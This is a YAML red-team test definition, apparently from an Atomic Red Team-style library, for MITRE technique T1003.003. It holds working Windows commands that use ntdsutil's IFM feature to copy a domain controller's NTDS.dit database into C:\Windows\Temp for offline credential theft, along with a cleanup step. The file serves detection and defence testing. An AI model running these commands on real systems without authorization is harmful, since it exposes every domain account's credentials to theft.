- id: ebe9614c-32ce-54e1-a2c4-9e2a98a0332b
  name: Soumaia ART Tests - Dump Active Directory Database with NTDSUtil
  description: 'This test is intended to be run on a domain Controller.


    The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability

    uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of

    subsequent domain controllers without the need of network-based replication.


    Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory. (requires elevation)'
  tactic: credential-access
  technique:
    attack_id: T1003.003
    name: 'OS Credential Dumping: NTDS'
  platforms:
    windows:
      cmd:
        command: |-
          cmd /c "reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT"
          if not "%ERRORLEVEL%"=="0" (
              cmd /c "echo Sorry, Promoting this machine to a Domain Controller must be done manually"
          )
          mkdir C:\Windows\Temp\ntds_T1003
          ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
        cleanup: |-
          rmdir /q /s C:\Windows\Temp\ntds_T1003 >nul 2>&1
